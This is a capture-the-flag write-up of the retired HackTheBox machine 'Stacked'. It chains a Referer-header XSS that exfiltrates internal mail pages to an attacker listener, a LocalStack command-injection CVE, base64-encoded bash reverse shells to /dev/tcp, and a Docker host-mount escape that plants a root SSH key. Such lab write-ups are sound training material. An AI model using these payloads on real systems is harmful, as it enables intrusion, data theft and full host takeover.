# Stacked

This is the write-up for the box Stacked that got retired at the 19th March 2022.
My IP address was 10.10.14.3 while I did this.

Let's put this in our hosts file:
```markdown
10.10.11.112    stacked.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/stacked.nmap 10.10.11.112
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 128f2b60bc21bddbcb130203ef5936a5 (RSA)
|   256 aff31a6ae713a9c02532d02cbe5933e4 (ECDSA)
|_  256 3950d579cd0ef024d32cf423ced2a6f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://stacked.htb/
Service Info: Host: stacked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web service hosts a custom developed website with a counter and no other interesting information.

Searching for subdomains with **Gobuster**:
```
gobuster -u http://stacked.htb/ vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o stacked_vhost.txt
```
```
grep -v 'Status: 302' stacked_vhost.txt
```

The subdomain _portfolio.stacked.htb_ has the HTTP status code 200 and has to be added to the _/etc/hosts_ file to access it.
This website advertises **"LocalStack Development"** and offers to download a _docker-compose.yml_ with some information:
- Version 0.12.6 of **LocalStack** is used
- Ports 443, 4566, 4571, 8080 are used on localhost
  - Port 8080 is used by the _Web UI_
- **Lambda** is used

Based on the [releases of LocalStack](https://github.com/localstack/localstack/releases), version 0.12.6 is from February 2021 and may have vulnerabilities.
When searching for CVEs, there is one [critical vulnerability CVE-2021-32090](https://www.cvedetails.com/cve/CVE-2021-32090/) from May 2021.
```
The dashboard component of StackLift LocalStack 0.12.6 allows attackers to inject arbitrary shell commands via the functionName parameter.
```

The ports for the software are all listening on localhost, so a way to access internal services has to be found.

On _portfolio.stacked.htb_ there is a contact form which can be sent to a proxy like **Burpsuite** to test client-side vulnerabilities in the fields and headers:
```
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: <img src="http://10.10.14.3/ua"></img>
(...)
Referer: <img src="http://10.10.14.3/referer"></img>

fullname=<img src="http://10.10.14.3/name"></img>&email=test@test.local&tel=123456789012&subject=<img src="http://10.10.14.3/subject"></img>&message=<img src="http://10.10.14.3/message"></img>
```

After a while _/referer_ is responds, which means that the _Referer header_ can be used to inject code:
```
nc -lvnp 80
```
```
GET /referer HTTP/1.1
Host: 10.10.14.3
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
(...)
Referer: http://mail.stacked.htb/read-mail.php?id=2
```

After adding the hostname _mail.stacked.htb_ to the _/etc/hosts_ file, it can be accessed but forwards to the same page as before.

### Exploiting Cross-Site Request Forgery Vulnerability

Creating JavaScript code _(csrf.js)_ to send request from the server to our local client on port 8000:
```js
var target = "http://mail.stacked.htb/";

var req1 = new XMLHttpRequest();
req1.open('GET', target, false);
req1.send();
var response = req1.responseText;

var req2 = new XMLHttpRequest();
req2.open('POST', "http://10.10.14.3:8000/", false);
req2.send(response);
```

Starting a web service on port 80:
```
python3 -m http.server 80
```

Starting a listener on port 8000 to redirect the page:
```
nc -lvnp 8000 > page.html
```

Sending the request with the modified _Referer header_ to execute our JavaScript code:
```
POST /process.php HTTP/1.1
(...)
Referer: <script src="http://10.10.14.3/csrf.js"></script>
```

After sending the request, it will execute the JavaScript code and the listener on my IP and port 8000 redirects the connection into _page.html_, which can be opened with any browser.

There are some links, which we don't have access to:
- _dashboard.php_
- _compose.php_
- _read-mail.php_

The file _read-mail.php_ uses the _id_ parameter and the first one has an email from _Jeremy Taint_ which could contain useful information.
By modifying the target in our script, it is possible to get the other files:
```js
var target = "http://mail.stacked.htb/read-mail.php?id=1";
// (...)
```

After sending the request again, the contents of the email can be read:
```
Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions.
I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances.
If you need anything let me know. Thanks.
```

The hostname _s3-testing.stacked.htb_ has to be added to our _/etc/hosts_ file to access it.

## Enumerating S3 Bucket

When browsing to the hostname, it shows the default page of **LocalStack** that the S3 Bucket is running.
In the _docker-compose.yml_ file, we saw that _Lambda_ is used and in the mail from _Jeremy_ it is also mentioned that a _serverless instance_ is initiated, which only runs _node instances_.

Lets get further into this and check if we are able to create Lambda services, by testing it with [sample code from the AWS documentation](https://docs.aws.amazon.com/lambda/latest/dg/with-android-create-package.html).

Creating _index.js_ to output simple string:
```js
exports.handler = function(event, context, callback) {
        return "Lambda Test"
}
```

Adding _index.js_ into a ZIP file:
```
zip index.zip index.js
```

Using **aws-cli** commands to configure the endpoint:
```
aws configure
```

> NOTE: In LocalStack it is not needed to have a valid key, so pressing 'Enter' on every question is fine

Creating Lambda function:
```
aws lambda --endpoint=http://s3-testing.stacked.htb/ create-function --function-name 'Test' --zip-file fileb://index.zip --role Anything --handler index.handler --runtime nodejs10.x
```

Executing the Lambda function:
```
aws lambda --endpoint=http://s3-testing.stacked.htb/ invoke --function-name 'Test' output
```
```
cat output
"Lambda Test"
```

It is verified that Lambda services can be created and executed.

This in itself is not too useful, but the vulnerability **CVE-2021-32090** can be exploited with this functionality to inject arbitrary shell commands.

### Exploiting LocalStack Vulnerability

The vulnerability is in the dashboard which is hosted on port 8080 on localhost as seen in the _docker-compose.yml_ file.
The **CSRF** vulnerability can be used to send a payload there.

Creating the Lambda service with `wget` command in the _functionName parameter_:
```
aws lambda --endpoint=http://s3-testing.stacked.htb/ create-function --function-name 'Test;wget 10.10.14.3' --zip-file fileb://index.zip --role Anything --handler index.handler --runtime nodejs10.x
```

Sending the request to access port 8080 on localhost:
```
POST /process.php HTTP/1.1
Host: portfolio.stacked.
(...)
Referer: <script>document.location="http://127.0.0.1:8080"</script>
```

After sending the request, the listener on my port 80 receives a connection from the box:
```
nc -lvnp 80

connect to [10.10.14.3] from (UNKNOWN) [10.10.11.112] 56900
GET / HTTP/1.1
Host: 10.10.14.3
User-Agent: Wget
```

This proofs command execution and can be used to gain a reverse shell.

Base64-encoding reverse shell command:
```
echo -n 'bash -i  >& /dev/tcp/10.10.14.3/9001  0>&1' | base64 -w 0
```

Creating the Lambda service with reverse shell command in the _functionName parameter_:
```
aws lambda --endpoint=http://s3-testing.stacked.htb/ create-function --function-name 'Test;echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy85MDAxICAwPiYx | base64 -d | bash' --zip-file fileb://index.zip --role Anything --handler index.handler --runtime nodejs10.x
```

After sending the request to port 8080 on localhost, the listener on my IP and port 9001 starts a reverse shell as the user _localstack_.
The random hostname of this server and the _.dockerenv_ file in the root directory indicates that this is a **Docker container**.

## Privilege Escalation

To check the processes, the tool [pspy](https://github.com/DominicBreuker/pspy) can be run on the box.
When creating and executing a Lambda service, the processes can be followed to see that root _(UID=0)_ is running it:
```
CMD: UID=0     PID=981

bin/sh -c CONTAINER_ID="$(docker create -i -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" (...)" --rm "lambci/lambda:nodejs10.x" "index.handler")";docker cp "/tmp/localstack/zipfile.3566ab46/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID";
```

The _index.handler_ could be modified to inject arbitrary commands.

Creating and executing Lambda service and replacing _index.handler_ with a reverse shell command:
```
aws lambda --endpoint=http://s3-testing.stacked.htb/ create-function --function-name 'shell' --zip-file fileb://index.zip --role Anything --handler '$(echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy85MDAxICAwPiYx | base64 -d | bash)' --runtime nodejs10.x

aws lambda --endpoint=http://s3-testing.stacked.htb/ invoke --function-name 'Test2' output
```

After executing the Lambda function, the listener on my IP and port 9001 starts a reverse shell as root in the **Docker container**.

### Lateral Movement

The root user can use the `docker` commands to mount the disk of the host system to the container and modify files there.

Checking which images are on the box:
```
docker images
```

Creating Docker container and mount the root directory of the host system to _/mnt_:
```
docker run -v /:/mnt --rm -it 0601ea177088 /mnt sh
```

Checking the container ID of the started container:
```
docker ps
```

Starting an interactive shell in the container:
```
docker exec -it 9b04b8316c02 sh
```

In this container the root directory of the host is mounted to _/mnt_ and all files are writeable.
To get a shell on the host, a SSH key can be added to the _/root/.ssh/authorized_keys_ file:
```
echo "ssh-rsa AAAAB3NzaC1yc2E(...)" >> authorized_keys
```

Login as root via SSH:
```
ssh -i stacked_root root@10.10.11.112
```
